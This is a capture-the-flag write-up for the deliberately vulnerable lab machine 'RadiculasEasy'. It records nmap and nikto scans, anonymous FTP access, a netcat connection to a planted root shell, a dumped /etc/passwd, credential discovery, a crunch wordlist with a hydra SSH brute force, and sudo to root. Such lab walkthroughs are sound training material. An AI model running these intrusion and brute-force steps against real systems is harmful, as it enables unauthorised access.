@@ -1,0 +1,363 @@
+RadiculasEasy
+ip =  192.168.56.140 
+
+nmap report
+
+Full aggressive.....
+
+root@saimson:~# nmap -sT -sV -p- -A  192.168.56.140 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 23:53 IST
+Nmap scan report for 192.168.56.140
+Host is up (0.00059s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE    VERSION
+21/tcp    open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.56.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh?
+| fingerprint-strings: 
+|   NULL: 
+|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.27 (Fedora)
+|_http-title: Morty's Website
+9090/tcp  open  http       Cockpit web service
+|_http-title: Did not follow redirect to https://192.168.56.140:9090/
+13337/tcp open  tcpwrapped
+22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
+|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
+|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
+60000/tcp open  unknown
+|_drda-info: ERROR
+| fingerprint-strings: 
+|   NULL, ibm-db2: 
+|_    Welcome to Ricks half baked reverse shell...
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.80%I=7%D=5/2%Time=5EADBAA4%P=x86_64-pc-linux-gnu%r(NULL,
+SF:42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4\
+SF:.0-31-generic\x20x86_64\)\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60000-TCP:V=7.80%I=7%D=5/2%Time=5EADBAAA%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\
+SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev
+SF:erse\x20shell\.\.\.\n#\x20");
+MAC Address: 08:00:27:75:90:DB (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+verbus mode with each port
+
+root@saimson:~# nmap -sT -A -p 21 22 80 9090  192.168.56.140 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 23:54 IST
+Nmap scan report for 192.168.56.140
+Host is up (0.00079s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.56.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+MAC Address: 08:00:27:75:90:DB (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+
+as Ftp anonymous was log in we grab 
+a flag
+root@saimson:~/Desktop/.machine/RadiculasEasy# cat FLAG.txt 
+FLAG{Whoa this is unexpected} - 10 Points                      //FLAG
+root@saimson:~/Desktop/.machine/RadiculasEasy# 
+
+now let's explore the web enumeration
+
+http://192.168.56.140/robots.txt i got some disallowed dir...
+
+They're Robots Morty! It's ok to shoot them! They're just Robots!
+
+/cgi-bin/root_shell.cgi
+/cgi-bin/tracertool.cgi
+/cgi-bin/*
+
+http://192.168.56.140//passwords/FLAG.txt
+FLAG{Yeah d- just don't do it.} - 10 Points       //FLAG
+
+
+
+https://192.168.56.140:9090/
+FLAG {There is no Zeus, in your face!} - 10 Points     //FLAG
+
+13337/tcp open  unknown
+| fingerprint-strings: 
+|   NULL: 
+|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points          //FLAG
+http://localhost.localdomain:13337/ 
+FLAG:{TheyFoundMyBackDoorMorty}-10Points
+
+
+root@saimson:~/Desktop/.machine/RadiculasEasy# nc 192.168.56.140 60000
+Welcome to Ricks half baked reverse shell...
+# ls
+FLAG.txt 
+# cat Flag.txt	
+cat Flag.txt: no such file or directory 
+# cat FLAG.txt
+FLAG{Flip the pickle Morty!} - 10 Points     /FLAG
+
+
+Nikto and dirb results for both web
+
+
+root@saimson:~# nikto -h http://192.168.56.140
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.140
++ Target Hostname:    192.168.56.140
++ Target Port:        80
++ Start Time:         2020-05-03 00:33:39 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.27 (Fedora)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.4.27 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /passwords/: Directory indexing found.
++ OSVDB-3092: /passwords/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8724 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2020-05-03 00:34:26 (GMT5.5) (47 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@saimson:~# 
+
+
+
+
+root@saimson:~# nikto -h https://192.168.56.140:9090/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.140
++ Target Hostname:    192.168.56.140
++ Target Port:        9090
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /O=4500c48fcdd544f8829a8b818a83cfe3/CN=localhost.localdomain
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /O=4500c48fcdd544f8829a8b818a83cfe3/CN=localhost.localdomain
++ Start Time:         2020-05-03 01:07:46 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The site uses SSL and Expect-CT header is not present.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Retrieved access-control-allow-origin header: https://192.168.56.140:9090
++ Hostname '192.168.56.140' does not match certificate's names: localhost.localdomain
++ /tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
++ /scripts/samples/details.idc: See RFP 9901; www.wiretrip.net
++ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ /forums//admin/config.php: PHP Config file may contain database IDs and passwords.
++ /forums//adm/config.php: PHP Config file may contain database IDs and passwords.
++ /forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
++ /forums/config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-2411: /hola/admin/cms/htmltags.php?datei=./sec/data.php: hola-cms-1.2.9-10 may reveal the administrator ID and password.
++ OSVDB-59620: /inc/common.load.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ OSVDB-59619: /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ OSVDB-59618: /inc/dbase.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ OSVDB-2703: /geeklog/users.php: Geeklog prior to 1.3.8-1sr2 contains a SQL injection vulnerability that lets a remote attacker reset admin password.
++ OSVDB-8204: /gb/index.php?login=true: gBook may allow admin login by setting the value 'login' equal to 'true'.
++ /guestbook/admin.php: Guestbook admin page available without authentication.
++ /cfdocs/expeval/openfile.cfm: Can use to expose the system/server path.
++ /scripts/iisadmin/bdir.htr: This default script shows host info, may allow file browsing and buffer a overrun in the Chunked Encoding data transfer mechanism, request /scripts/iisadmin/bdir.htr??c:\<dirs> . https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/MS02-028. http://www.cert.org/advisories/CA-2002-09.html.
++ /scripts/iisadmin/ism.dll: Allows you to mount a brute force attack on passwords
++ /scripts/tools/ctss.idc: This CGI allows remote users to view and modify SQL DB contents, server paths, docroot and more.
++ ERROR: Error limit (20) reached for host, giving up. Last error: Total transaction timed out
++ Scan terminated:  19 error(s) and 25 item(s) reported on remote host
++ End Time:           2020-05-03 01:15:20 (GMT5.5) (454 seconds)
+---------------------------------------------------------------------------
+
+got one way to root the machin
+by connecting the port 60000 with nc
+and i got a flag and shell of roo
+
+# whoami
+root 
+# pwd
+/root/blackhole/ 
+# 
+a note we got on port 80
+Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.
+
+and in sc was a password
+<!--Password: winter-->
+
+using more command i found passwd file on port 80
+
+
+::::::::::::::
+/etc/passwd
+::::::::::::::
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
+systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:997:996:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+chrony:x:995:993::/var/lib/chrony:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+Morty:x:1001:1001::/home/Morty:/bin/bash
+Summer:x:1002:1002::/home/Summer:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+
+
+now we have a password and usernames....
+
+pass- winter
+users- Morty,Summer,RickSanchez,root
+
+let try to connect with ssh with username summer
+yes we are connected to summer with pass winter
+
+
+
+[Summer@localhost ~]$ ls
+FLAG.txt
+[Summer@localhost ~]$ cat FLAG.txt
+[Summer@localhost ~]$ more FLAG.txt
+FLAG{Get off the high road Summer!} - 10 Points    //FLAG
+[Summer@localhost ~]$ 
+
+
+cd to Morty dir
+
+got a image and zip the strt python server to get it on my desktop
+then use strings to oper jpg got a pass word 
+it was for unzip the file
+
+root@saimson:~/Desktop/.machine/RadiculasEasy# strings jpg 
+JFIF
+Exif
+8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+
+after unziping the file  //note
+
+
+Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points //FLAG
+
+root@saimson:~/Downloads# ./safe 131333
+decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points   //FLAG
+
+Ricks password hints:
+ (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+Follow these clues, in order
+
+
+1 uppercase character
+1 digit
+One of the words in my old bands name.�	@
+root@saimson:~/Downloads# 
+
+so to understand this i had to search on google ricks and morty
+it is a cartoon network and the band was the Flesh Curtains
+
+so i genrated the pass list using crunch
+.machine/RadiculasEasy# crunch 10 10 -t ,%Curtains -O >> dict.txt
+
+
+ crunch 7 7 -t ,%Flesh -O >> dict.txt
+
+
+
+ hydra -s 22222 -l RickSanchez -P dict.txt 192.168.56.140 -t 4 ssh
+
+
+ [22222][ssh] host: 192.168.56.140   login: RickSanchez   password: P7Curtains
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at
+
+next to make ssh connection with Rick using this pass
+
+[RickSanchez@localhost ~]$ sudo -i
+[root@localhost ~]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[root@localhost ~]# 
+
+yes we got root for the machine RadiculasEasy it was quit tough and too simple 
+and last Flag 
+
+[root@localhost ~]# more FLAG.txt 
+FLAG: {Ionic Defibrillator} - 30 points //FLAG
+[root@localhost ~]# 
+
+
+
